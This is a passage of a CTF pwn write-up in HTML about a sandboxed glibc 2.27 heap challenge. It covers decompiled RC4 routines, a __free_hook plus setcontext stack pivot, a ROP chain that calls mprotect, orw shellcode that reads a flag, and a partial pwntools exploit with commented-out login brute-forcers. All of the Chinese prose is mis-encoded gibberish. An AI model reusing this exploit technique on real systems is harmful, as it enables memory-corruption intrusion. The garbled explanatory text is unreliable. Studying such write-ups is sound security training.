class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt1</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *key, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-119h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE v8[<span class="number">264</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    v8[i] = key[i % a3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = ((<span class="type">char</span>)v8[j] + v7 + (<span class="type">unsigned</span> __int8)a1[j]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[j];</span><br><span class="line">    a1[j] = a1[v7];</span><br><span class="line">    a1[v7] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–sç›’åå°±æ˜¯åŠ å¯†äº†ã€‚åŠ å¯†åŒæ ·æ¥å—ä¸‰ä¸ªå‚æ•°ï¼šåˆå§‹åŒ–å¥½çš„sboxï¼Œå¾…åŠ å¯†çš„æ˜æ–‡ï¼Œä»¥åŠæ˜æ–‡é•¿åº¦ã€‚</p><p>RC4åŠ å¯†å…¶å®å°±æ˜¯éå†æ•°æ®,å°†æ•°æ®ä¸sboxè¿›è¡Œå¼‚æˆ–åŠ å¯†,è€Œåœ¨æ­¤ä¹‹å‰è¿˜éœ€è¦äº¤æ¢ä¸€æ¬¡sboxçš„æ•°æ®äº¤æ¢å®Œä¹‹å å†æŠŠs[i] + s[j]çš„ç»„åˆå½“åšä¸‹æ ‡å†å»å¼‚æˆ–.ä¸‹é¢æ˜¯æœ¬é¢˜ä¸­çš„åŠ å¯†å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt2</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+23h] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+24h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v6 = (v6 + (<span class="type">unsigned</span> __int8)a1[v5]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[v5];</span><br><span class="line">    a1[v5] = a1[v6];</span><br><span class="line">    a1[v6] = v4;</span><br><span class="line">    a2[i] ^= a1[(<span class="type">unsigned</span> __int8)(a1[v5] + a1[v6])];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºåœ¨è¯»å†™çš„æ—¶å€™éƒ½ä¼šè°ƒç”¨è¿™å¥—åŠ å¯†ï¼Œåˆ›å»ºchunkçš„æ—¶å€™ä¼šå°†è¾“å…¥åŠ å¯†åå­˜å‚¨ï¼Œreadçš„æ—¶å€™ä¼šå…ˆè§£å¯†è¯»å®Œå†åŠ å¯†å†™å›å»ï¼Œfreeåˆ™æ˜¯ä¼šå…ˆè§£å¯†å†freeï¼ˆè¿˜ç®—æœ‰ç‚¹è‰¯å¿ƒï¼Ÿï¼‰ã€‚</p><h1>æ”»å‡»æ€è·¯ï¼ˆé‡è¦ï¼‰</h1><p>glibc2.27çš„noexecveçš„ç®€å•æ²™ç®±ï¼Œæˆ‘ä»¬è‚¯å®šæ˜¯setcontextæ ˆè¿ç§»äº†ï¼Œ2.27è¿˜ä¸ç”¨FSOPï¼Œç›´æ¥ç”¨hookå°±è¡Œã€‚</p><h2 id="ä»€ä¹ˆæ˜¯setcontextï¼Ÿ">ä»€ä¹ˆæ˜¯setcontextï¼Ÿ</h2><p>è¿™æ˜¯ä¸€ä¸ªglibcåº“ä¸­çš„å‡½æ•°ï¼Œç”¨äºæ¢å¤ä¸Šä¸‹æ–‡ã€‚è¯¢é—®aiç»™å‡ºçš„ç­”æ¡ˆæ˜¯ï¼Œè¿™ä¸ªå‡½æ•°ä¸€æ˜¯å¯ä»¥ç”¨äºåœ¨ç”¨æˆ·æ€å®ç°çº¿ç¨‹å’Œåç¨‹ï¼ŒäºŒæ˜¯ä½œä¸ºPOSIXæ ‡å‡†çš„æ®‹ç•™æ¥å£ä¿ç•™äº†ä¸‹æ¥ã€‚</p><p>è¿™ä¸ªå‡½æ•°ç‰›é€¼åœ¨ä»€ä¹ˆåœ°æ–¹å‘¢ï¼Œå®ƒæ—¢ç„¶æ˜¯æ¶‰åŠåˆ°åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å¯¹å¤§é‡çš„å¯„å­˜å™¨èµ‹å€¼ã€‚è¿™ä¸ªå‡½æ•°ä¸­æœ‰<code>mov rsp,xxx</code>è¿™æ ·çš„gadgetï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªä¸œè¥¿åœ¨ç”¨æˆ·æ€åŠ«æŒæ ˆï¼Œå®ç°<br>stack pivotã€‚è¿™ç§æ”»å‡»æ–¹å¼åœ¨æ²™ç®±heapä¸­éå¸¸å¸¸è§ï¼Œå¦‚æœæˆ‘ä»¬èƒ½åŠ«æŒä¸€æ¬¡æ§åˆ¶æµï¼Œå°±æ€»èƒ½æƒ³åŠæ³•ç”¨è¿™ä¸ªgadgetå®ç°æ ˆè¿ç§»æœ€åROPã€‚</p><p>åœ¨glibcè¾ƒä½çš„ç‰ˆæœ¬ä¸­ï¼Œéå¸¸å¥½çš„åœ°æ–¹æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°å¯¹rspèµ‹å€¼è¿˜æ˜¯åŸºäºrdiçš„ã€‚ä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œ<code>setcontext+53</code>çš„åœ°æ–¹å­˜æ”¾çš„æ˜¯è¿™æ ·çš„ä¸€æ¡æŒ‡ä»¤ï¼š<code>mov rsp, [rdi+0xa0]</code>ã€‚rdiæ˜¯æˆ‘ä»¬å–œé—»ä¹è§çš„ï¼Œå¥½æ§åˆ¶çš„å¯„å­˜å™¨ï¼Œå› æ­¤è¿™ä¸ªå¾ˆå¥½ç”¨ã€‚å¦‚æœæˆ‘ä»¬å‡½æ•°ç¬¬ä¸€å‚æ•°æ˜¯ä¸€ä¸ªå¯æ§çš„æŒ‡é’ˆï¼Œé‚£å°±ä»»æ„æ ˆè¿ç§»äº†ï¼Œäºæ˜¯å¯ä»¥ç»“åˆfree_hookå»åˆ©ç”¨ã€‚</p><p>å¦å¤–ï¼Œåœ¨è¾ƒé«˜çš„ç‰ˆæœ¬ä¸­æ¯”å¦‚glibc2.35ï¼Œè¿™ä¸ªå‡½æ•°ä¸å†ä¾æ®rdièµ‹å€¼ï¼Œè€Œæ˜¯å˜æˆäº†rdxï¼ˆåç§»ä¹Ÿå˜æˆäº†setcontext+61ï¼‰ã€‚è¿™è®©æˆ‘ä»¬çš„åˆ©ç”¨éš¾åº¦æœ‰æ‰€å¢åŠ ä½†æ˜¯ä¸å¤šï¼Œå› ä¸ºæˆ‘ä»¬èƒ½æ‰¾åˆ°äº¤æ¢rdxå’Œrdiçš„gadgetã€‚ä»¥glibc2.35ä¸ºä¾‹ï¼Œå°±åœ¨0x167420è¿™ä¹ˆä¸€ä¸ªgadgetï¼š<code>0x0000000000167420 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>, å°†<code>rdi+8</code>æŒ‡å‘çš„å†…å®¹èµ‹å€¼ç»™rdxï¼Œå°†raxå†™å…¥æ ˆé¡¶ï¼Œç„¶åè·³åˆ°<code>rdx+0x20</code>æŒ‡å‘çš„ä½ç½®æ‰§è¡Œã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½é—´æ¥åœ°å®ç°å°†rdiå’Œrdxå…³è”èµ·æ¥ï¼Œåˆ©ç”¨rdiç»™rdxèµ‹å€¼ç„¶åå†setcontext</p><p>æœ€åsetcontextè¿™æ®µå‡½æ•°åœ¨ç»™rspèµ‹å€¼åï¼Œä¼š<code>mov rcx,[rdi+0xa8]</code>ç„¶å<code>push rcx</code>æœ€åretï¼Œå› æ­¤æˆ‘ä»¬åœ¨fakestackåœ°å€+0x8çš„ä½ç½®å°±å¯ä»¥å†™å…¥æˆ‘ä»¬æ¥ä¸‹æ¥è¦æ‰§è¡Œçš„å†…å®¹ã€‚å¥½ç”¨</p><blockquote><p>å¦å¤–ï¼ŒåŸºäºä¸Šä¸‹æ–‡åˆ‡æ¢è¿˜å­˜åœ¨ä¸€ç§å«åšâ€œSROPâ€çš„æ”»å‡»æ–¹æ³•ï¼Œæ˜¯åˆ©ç”¨ä¿¡å·ä¸­æ–­ç­‰æ–¹å¼ï¼Œé€šè¿‡åœ¨æ ˆä¸Šä¼ªé€ ä¸Šä¸‹æ–‡è¾¾æˆæ§åˆ¶æµåŠ«æŒï¼Œå’Œæˆ‘ä»¬ç”¨setcontexgtçš„gadgetæœ‰ç‚¹ç‚¹ç±»ä¼¼</p></blockquote><h2 id="å›åˆ°é¢˜ç›®â€¦">å›åˆ°é¢˜ç›®â€¦</h2><p>å› æ­¤ï¼Œåœ¨ä½ç‰ˆæœ¬è¿˜æœ‰hookçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯¹äºæ²™ç®±heapé¢˜çš„æ€è·¯å°±æ˜¯free_hook+setcontextæ ˆè¿ç§»ropã€‚ropæœ‰ä¸¤ç§æ€è·¯ï¼Œä¸€ç§æ˜¯çº¯ropå»libcä¸­æ‰¾orwï¼Œå¦ä¸€ç§æ˜¯å†™shellcodeï¼Œç„¶åç”¨mprotectå…ˆæŠŠheapå¯æ‰§è¡Œã€‚ç”±äºç¬¬ä¸€æ¬¡æ¥è§¦æ—¶çœ‹çš„expé‡‡ç”¨åè€…ï¼Œä¸‹é¢ç¬”è€…ä¹Ÿä½¿ç”¨åè€…çš„æ–¹æ³•ã€‚</p><p>å¯¹äºå¼€äº†æ²™ç®±çš„é¢˜ç›®ï¼Œé¦–å…ˆåº”è¯¥åŠ¨è°ƒåˆ°æˆ‘ä»¬èƒ½å¤Ÿæ‰‹åŠ¨æ§åˆ¶åˆ†é…çš„åœ°æ–¹ï¼Œè§‚å¯Ÿå †çš„æ’å¸ƒï¼Œä»è€Œç¡®å®šæˆ‘ä»¬æ¥ä¸‹æ¥åˆ†é…çš„sizeå’Œå †é£æ°´éœ€æ±‚ï¼Œä¸€èˆ¬tcacheå’Œsmallbinä¼šæ¯”è¾ƒä¹±ï¼Œä¸€èˆ¬ä¼šæŒ‘ä¸€ä¸ªsizeé€šè¿‡å–å’Œæ”¾å°†tcacheå¡«æ»¡åè¿›è¡Œæˆ‘ä»¬åç»­çš„å·¥ä½œã€‚</p><p>å¯¹æœ¬é¢˜æ¥è¯´å…·ä½“çš„æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li class="lvl-3"><p>ç®€å•å †é£æ°´ï¼Œç„¶åç”¨unsortedbinæ³„éœ²libcï¼Œç”¨tcacheæ³„éœ²å †åœ°å€</p></li><li class="lvl-3"><p>å‡†å¤‡å·¥ä½œï¼Œå…ˆåœ¨ä¸€ä¸ªchunk1ä¸­å¸ƒå±€æˆ‘ä»¬çš„fakestackï¼ˆå…·ä½“å†…å®¹è§åç»­ï¼‰</p></li><li class="lvl-3"><p>ç„¶ååœ¨å¦ä¸€ä¸ªchunk2é‡Œå¡«å……0xa0åƒåœ¾æ•°æ®åï¼Œåœ¨0xa0åç§»å†™å…¥fakestackçš„æ ˆé¡¶ï¼ˆchunk1å¯¹åº”ä½ç½®ï¼‰ï¼Œç„¶ååœ¨0xa8å†™å…¥retçš„gadgetåœ°å€</p></li><li class="lvl-3"><p>ä»»æ„åœ°å€åˆ†é…chunkåˆ†é…åˆ°freehookå¤„ï¼Œåœ¨freehookå†™å…¥setcontext+53çš„åœ°å€</p></li><li class="lvl-3"><p>æœ€åfreeæ‰chunk2ï¼Œè§¦å‘</p></li></ol><p>æ­¤æ—¶ç»å†äº†ä¸‹è¿°æµç¨‹ï¼š<br>free_hook(rdi=chunk2_addr)<br>-&gt;(mov rsp,[rdi+0xa0]ï¼Œæ­¤æ—¶rspå†…æ˜¯chunk1_addrï¼Œæ ˆå·²ç»è¢«æ¢)<br>-&gt;(mov rcx,[rdi+0xa8];push rcxï¼Œæ­¤æ—¶æ ˆé¡¶æ˜¯ä¸€ä¸ªretçš„åœ°å€)<br>-&gt;retä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡retå°±å¯åŠ¨äº†æˆ‘ä»¬fakestackä¸Šçš„ropé“¾</p><h2 id="ä¸€äº›æ¿å­">ä¸€äº›æ¿å­</h2><p>å…³äºfakestackçš„å¸ƒç½®ï¼Œè¿™é‡Œå†™ä¸€ä¸ªæ¿å­ï¼Œå› ä¸ºæˆ‘ä»¬é¦–å…ˆè¦è°ƒç”¨mprotectï¼Œå› æ­¤è¦è¿™ä¹ˆå¸ƒç½®ï¼ˆå¼€å§‹å¯ä»¥å¡«å¾ˆå¤šretæ— æ‰€è°“çš„ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p64(ret)</span><br><span class="line">+p64(pop_rdi)</span><br><span class="line">+p64(heap_base)</span><br><span class="line">+p64(pop_rsi)</span><br><span class="line">+p64(<span class="number">0x7000</span>)ï¼ˆsizeï¼Œæ— æ‰€è°“ï¼Œå¤§ç‚¹ä¹Ÿå¥½ï¼‰</span><br><span class="line">+p64(pop_rdx)</span><br><span class="line">+p64(<span class="number">0x7</span>)</span><br><span class="line">+p64(mprotect)ï¼ˆç›´æ¥libc.symå°±è¡Œï¼‰</span><br><span class="line">+p64(heap_base+<span class="number">0x1670</span>+<span class="number">0x58</span>)ï¼ˆæŒ‡å‘shellcodeï¼Œä¹Ÿå°±æ˜¯ä¸‹ä¸€è¡Œçš„èµ·å§‹åœ°å€å°±è¡Œï¼‰</span><br><span class="line">+asm(shellcode)ï¼ˆorwï¼‰</span><br></pre></td></tr></table></figure><p>ç„¶åshellcodeå¦‚ä¸‹ï¼Œbufferéšä¾¿å†™ä¸€ä¸ªèƒ½è¯»å†™çš„åœ°å€å°±è¡Œï¼Œheap+0x3000è¿™ç§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">    shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">    + shellcraft.read(<span class="string">&quot;rax&quot;</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, buffer, <span class="number">0x50</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1>æ€»ç»“</h1><p>æœ€ç®€å•çš„æ²™ç®±å †ï¼Œä½†æ˜¯ä¹ŸèŠ±äº†å°åŠå¤©æ¥å¤ç°ã€‚æ›´é«˜çš„ç‰ˆæœ¬ä¹Ÿæ— éå°±æ˜¯ç”¨fsopçš„é“¾å­ï¼Œé‚£ä¸€æ¬¡çš„æ§åˆ¶æµåŠ«æŒæ¢åˆ°å…¶ä»–ç‚¹ç„¶ååç»­è¿˜æ˜¯ä¸€æ ·çš„ã€‚æˆ–è€…æ˜¯å…ˆè·³åˆ°magic_gadgetï¼Œå°±æ˜¯éº»çƒ¦äº†ç‚¹ã€‚</p><h1>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># p=remote(&quot;0192d66238177833936ff330dfec8bbd.huj5.dg04.ciihw.cn&quot;,43631)</span></span><br><span class="line"><span class="comment"># charset = &quot;\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # çˆ†ç ´ç”¨æˆ·å</span></span><br><span class="line"><span class="comment"># def crack_username():</span></span><br><span class="line"><span class="comment">#     username = b&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1, 128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=username + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid username!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid username length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Username correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 username += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(username)</span></span><br><span class="line"><span class="comment">#                 return username</span></span><br><span class="line"><span class="comment"># # 4dm1n</span></span><br><span class="line"><span class="comment"># def crack_password():</span></span><br><span class="line"><span class="comment">#     password=b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line"><span class="comment">#     while True:</span></span><br><span class="line"><span class="comment">#         for char in range(1,128):</span></span><br><span class="line"><span class="comment">#             if(char == 10):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             crack=password + char.to_bytes()</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your username:&#x27;, b&#x27;4dm1n&#x27;)</span></span><br><span class="line"><span class="comment">#             p.sendlineafter(b&#x27;Input your password:&#x27;, crack)</span></span><br><span class="line"><span class="comment">#             p.recvline()</span></span><br><span class="line"><span class="comment">#             result=p.recvline()</span></span><br><span class="line"><span class="comment">#             if(result==b&#x27;Invalid password!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 continue</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Invalid password length!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#             elif(result==b&#x27;Password correct!\n&#x27;):</span></span><br><span class="line"><span class="comment">#                 password += char.to_bytes()</span></span><br><span class="line"><span class="comment">#                 print(password)</span></span><br><span class="line"><span class="comment">#                 return password</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(crack_username())</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=elf.process()</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;The result is:\n\t[key,value] = &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">    value=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(value)</span></span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sizeå–å†³äºæˆ‘ä»¬åˆ›å»ºæ—¶çš„è¾“å…¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the key: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the value: &#x27;</span>,value)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Success!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;s4cur1ty_p4ssw0rd&#x27;</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="comment"># s4cur1ty_p4ssw0rd</span></span><br><span class="line"><span class="comment"># glibc 2.27 heap æ²™ç®±no execve</span></span><br><span 